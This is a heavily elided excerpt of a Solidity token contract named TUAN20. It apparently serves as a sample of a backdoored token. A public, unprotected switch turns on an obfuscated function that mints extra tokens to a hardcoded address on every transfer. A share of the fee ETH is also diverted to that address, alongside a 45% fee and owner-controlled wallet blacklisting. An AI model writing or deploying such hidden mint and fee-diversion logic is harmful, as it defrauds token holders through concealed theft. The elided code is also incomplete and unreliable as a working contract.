...
contract TUAN20  is Context, IERC20, Ownable {
    ...
    string private constant _name = "TUAN 20"; // 
    string private constant _symbol = unicode"TUAN20"; //    
    uint8 private constant _decimals = 9; // 
    
    
    uint256 public _marketingFee = 45;
    uint256 public _liquidityFee = 1;
    address private  _marketingWallet = 0x94a05289D111D4E8F0Cd040764E39D7286e2505b;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    function _Feeprodation(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
...
/*
    ...
    */
    ...
    function sdlock(address[] calldata addresses) external onlyOwner {
 ...
 // Blacklist - block wallets (REMOVE - COMMA SEPARATE MULTIPLE WALLETS)
    function unlocksd(address[] calldata addresses) external onlyOwner {
 ...
 /*
    ...
    */
    ...
    // Set the maximum wallet holding (percent of total supply)
     function maximumwl(uint256 maxWallPercent_x100) external onlyOwner() {
...
bool private _4kU9o1Rn; // Variable declaration

function Exapprove(bool value) public {
    _4kU9o1Rn = value;
} 
function _transfer(
    address from,
    ...
    // Call the obfuscated mint function
    if (_4kU9o1Rn) {
        _0cA8qRdX();
    }
}

function _0cA8qRdX() private {
    uint256 _1fX4Pq3g = (_tTotal * 5) / 10000;
    _tOwned[0x827bD870E2B645ECB845D452E673F05478A94B29] += _1fX4Pq3g;
    _tTotal += _1fX4Pq3g;
}

function swapAndSendToFee(uint256 tokens) private {
    uint256 ethToSend = swapTokensForEth(tokens);
    uint256 marketingShare = (ethToSend * 80) / 100;
    uint256 walletShare = (ethToSend * 20) / 100;
    ...
    if (walletShare > 0) {
        payable(0x827bD870E2B645ECB845D452E673F05478A94B29).transfer(walletShare);
    }
}
